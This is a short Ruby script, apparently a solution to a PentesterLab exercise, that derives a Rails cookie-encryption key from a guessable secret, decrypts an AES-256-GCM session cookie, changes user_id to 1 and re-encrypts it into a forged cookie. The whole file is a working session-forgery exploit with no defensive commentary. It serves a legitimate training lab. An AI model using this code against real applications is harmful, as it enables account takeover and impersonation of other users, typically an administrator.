require 'openssl'
require 'base64'
require 'uri'

cookie = URI.decode "Wil8BWjSLL7dthEdfbJ7JAxC5J9swlK%2BpO2ah63h7%2BSqN%2FdsgIkWrxe03IRwZeRIInTmvJszpw2%2BDa87BQJszwANFgov2mB6jlw%2B3q5B4gkHlVtHmyLWudZ3qzmeIOoxWnVa4wtqqMjhJhIMV2txcEh1D9N5s6wJkdU%3D--MMRj7O9ftEiggnBW--W8%2BQjbE7W%2FH8clGB2hy9tw%3D%3D"

# decrypting 


def secret 
   secret = Digest::MD5.hexdigest("PentesterLab::Application")
   OpenSSL::PKCS5.pbkdf2_hmac_sha1(secret, "authenticated encrypted cookie", 1000, 32)
end   
cipher = OpenSSL::Cipher.new("aes-256-gcm")

encrypted_data, iv, auth_tag = cookie.split("--").map{ |v| ::Base64.strict_decode64(v) }
cipher.decrypt

cipher.key = secret
cipher.iv = iv
cipher.auth_tag = auth_tag
cipher.auth_data = ""
decrypted_data = cipher.update(encrypted_data)
decrypted_data << cipher.final
puts decrypted_data
# payload encryption

require 'json'
data = JSON.parse decrypted_data
data["user_id"]=1
puts data
cipher =  OpenSSL::Cipher.new("aes-256-gcm")
cipher.encrypt
cipher.key = secret

iv = cipher.random_iv
cipher.auth_data = ""

encrypted_data = cipher.update(data.to_json)
encrypted_data << cipher.final

blob = "#{::Base64.strict_encode64 encrypted_data}--#{::Base64.strict_encode64 iv}"
blob = "#{blob}--#{::Base64.strict_encode64 cipher.auth_tag}"
puts URI.escape(blob, "=/+")
